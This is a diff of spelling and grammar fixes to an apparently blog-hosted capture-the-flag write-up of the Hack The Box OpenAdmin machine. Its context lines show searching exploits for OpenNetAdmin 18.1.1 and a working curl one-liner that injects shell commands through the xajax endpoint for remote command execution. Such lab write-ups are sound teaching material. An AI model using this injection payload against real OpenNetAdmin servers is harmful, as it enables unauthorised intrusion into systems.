@@ -86,13 +86,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 By inspecting both /artwork and /sierra I found two template pages with nothing of interest. Both of the pages contain a contact form where at least /sierra maybe has a working form as something happens when I try to submit a message. Upon inspecting /music one finds a mostly empty template of a page, but upon hoovering over the login I see that the url redirects to 10.10.10.171/ona. 
 
 
-By inspecting /ona we are see that it's running OpenNetAdmin and it also informs us that it's a old version needing a update. 
+By inspecting /ona we are see that it's running OpenNetAdmin and it also informs us that it's an old version needing a update. 
 
 ![OpenNetAdmin index](https://dvardoo.github.io/images/openadmin/ona2.jpg "OpenNetAdmin index")
 {: .full}
 
 # Foothold
-Now lets find see if we can find a exploit for that version: 
+Now lets see if we can find a exploit for that version: 
 ~~~
 $ searchsploit opennetadmin 18.1.1
 ~~~
@@ -144,7 +144,7 @@ while true;do
 done
 ~~~
 
-By modifying the URL-part of the exploit and ponting it to the actual IP we can get a shell. Here I ran into some issues with the exploit as it would not run because of end of line characters. After trying a few times I made it into a working oneliner:
+By modifying the URL-part of the exploit and pointing it to the actual IP we can get a shell. Here I ran into some issues with the exploit as it would not run because of end of line characters. After trying a few times I made it into a working oneliner:
 
 ~~~
 $ while true;do echo -n "$ "; read cmd;curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1;done
@@ -190,7 +190,7 @@ $ona_contexts=array (
 );
 ~~~
 
-Also by using `ls` on /home-directory I found two different users: jimmy and joanna.
+Also by using `ls` on the home directory I found two different users: jimmy and joanna.
 ~~~
 $ ls /home
 ~~~
